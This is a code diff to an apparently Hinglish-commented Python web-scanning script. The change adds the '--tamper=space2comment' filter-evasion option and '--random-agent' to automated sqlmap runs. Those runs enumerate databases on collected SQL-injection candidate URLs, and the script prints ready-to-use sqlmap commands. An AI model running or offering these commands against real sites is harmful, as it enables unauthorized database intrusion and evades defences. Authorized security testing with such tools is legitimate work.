@@ -257,7 +257,7 @@ def run_sqlmap(sqli_urls):
             subprocess.run([
                 "sqlmap", "-u", full, "-p", p,
                 "--batch", "--level=3", "--risk=2", "--dbs",
-                "--threads=5", "--random-agent"
+                "--threads=5", "--random-agent", "--tamper=space2comment"
             ])
         except FileNotFoundError:
             print("[!] sqlmap install nahi hai. Chalao: sudo apt install sqlmap")
@@ -357,6 +357,8 @@ def main():
             for t in pe["tests"]:
                 guide = how_to_test(t)
                 if guide:
+
+                    
                     print(guide)
                     report_lines.append(guide)
             # SQLi candidates collect karo
@@ -375,7 +377,7 @@ def main():
         print(f"[+] SQLMAP READY COMMANDS ({len(sqli_urls)} candidates):")
         print(f"{'='*55}")
         for full, p in sqli_urls:
-            print(f'  sqlmap -u "{full}" -p {p} --batch --level=3 --risk=2 --dbs')
+            print(f'  sqlmap -u "{full}" -p {p} --batch --level=3 --risk=2 --dbs --random-agent --tamper=space2comment')
     else:
         print("\n[-] Koi SQLi candidate nahi mila is scan me.")
 
